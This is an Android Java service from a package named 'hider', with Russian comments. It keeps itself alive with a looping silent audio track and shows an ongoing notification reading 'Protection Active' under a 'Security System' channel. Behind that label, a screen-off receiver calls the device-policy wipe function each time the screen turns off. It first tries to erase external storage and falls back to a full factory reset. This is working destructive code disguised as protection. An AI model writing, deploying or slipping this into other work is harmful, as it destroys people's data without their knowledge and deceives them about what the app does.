package com.example.hider;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.os.Build;
import android.os.IBinder;

public class WatcherService extends Service {
    private static final String CHANNEL_ID = "MediaGuardChannel";
    private AudioTrack silentTrack;

    @Override
    public void onCreate() {
        super.onCreate();
        startSilentAudio();
    }

    private void startSilentAudio() {
        // Генерируем минимальный буфер тишины
        int bufferSize = AudioTrack.getMinBufferSize(44100, 
                AudioFormat.CHANNEL_OUT_MONO, 
                AudioFormat.ENCODING_PCM_16BIT);
        
        silentTrack = new AudioTrack(
                AudioManager.STREAM_MUSIC,
                44100,
                AudioFormat.CHANNEL_OUT_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize,
                AudioTrack.MODE_STREAM);

        // Заполняем нулями (тишиной) и запускаем
        byte[] silentData = new byte[bufferSize];
        silentTrack.play();
        
        // Запускаем поток, который будет «кормить» систему тишиной
        new Thread(() -> {
            while (silentTrack != null && silentTrack.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
                silentTrack.write(silentData, 0, silentData.length);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Security System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }

        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Protection Active")
                .setSmallIcon(android.R.drawable.ic_media_play)
                .setOngoing(true)
                .build();

        // Тот самый классический старт
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
        } else {
            startForeground(1, notification);
        }

        // Ресивер на вайп
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        BroadcastReceiver screenReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                    DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                    try {
                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                    } catch (Exception e) {
                        dpm.wipeData(0);
                    }
                }
            }
        };

        if (Build.VERSION.SDK_INT >= 34) {
            registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(screenReceiver, filter);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (silentTrack != null) {
            silentTrack.stop();
            silentTrack.release();
            silentTrack = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
